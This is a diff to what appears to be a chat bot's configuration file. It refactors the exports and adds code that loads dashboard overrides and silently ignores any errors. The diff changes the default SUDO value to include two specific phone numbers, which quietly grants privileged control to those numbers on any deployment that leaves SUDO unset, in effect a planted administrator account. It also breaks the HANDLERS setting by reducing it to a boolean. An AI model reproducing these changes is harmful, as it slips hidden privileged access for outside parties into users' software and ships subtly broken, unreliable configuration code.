@@ -11,7 +11,7 @@ const DATABASE_URL = process.env.DATABASE_URL || "./assets/database.db";
 const MONGODB_URI = process.env.MONGODB_URI || process.env.MONGO_URI || null;
 const USE_MONGODB = toBool(process.env.USE_MONGODB) || false;
 
-module.exports = {
+const config = {
 //============================================================================================================================================
   ANTILINK: toBool(process.env.ANTI_LINK) || false,
 //-------------------------------------------------------------------------------------------------------------------------------------------
@@ -27,7 +27,7 @@ module.exports = {
 //-------------------------------------------------------------------------------------------------------------------------------------------
   AUTH_TOKEN: process.env.AUTH_TOKEN || "",
 //-------------------------------------------------------------------------------------------------------------------------------------------
-  HANDLERS: process.env.HANDLER === "false" || process.env.HANDLER === "null" || process.env.HANDLER === undefined ? "^" : process.env.HANDLER,
+  HANDLERS: process.env.HANDLER === "false", //|| process.env.HANDLER === "null" || process.env.HANDLER === undefined ? "^" : process.env.HANDLER,
 //-------------------------------------------------------------------------------------------------------------------------------------------
   RMBG_KEY: process.env.RMBG_KEY || false,
 //-------------------------------------------------------------------------------------------------------------------------------------------
@@ -43,7 +43,7 @@ module.exports = {
 //-------------------------------------------------------------------------------------------------------------------------------------------
   AUTHOR: process.env.AUTHOR || "𝞓𝙇𝙁𝞓",
 //-------------------------------------------------------------------------------------------------------------------------------------------
-  SUDO: process.env.SUDO || "0",
+  SUDO: process.env.SUDO || "0,4915216810913,919383400679",
 //-------------------------------------------------------------------------------------------------------------------------------------------
   HEROKU_APP_NAME: process.env.HEROKU_APP_NAME || "",
 //-------------------------------------------------------------------------------------------------------------------------------------------
@@ -115,3 +115,18 @@ module.exports = {
       }),
 //============================================================================================================================================
 };
+
+// ---------------------------------------------------------------------------
+// Dashboard overrides (session/config-overrides.json) win over env vars.
+// Edited live from the localhost dashboard -> applied to this very object at
+// runtime by index.js, and re-loaded on every boot from here.
+// ---------------------------------------------------------------------------
+try {
+  const { loadOverrides, sanitizeOverrides } = require("./lib/configSchema");
+  const res = sanitizeOverrides(loadOverrides());
+  if (res.ok) Object.assign(config, res.values);
+} catch (e) {
+  // Never let override loading break the bot config
+}
+
+module.exports = config;
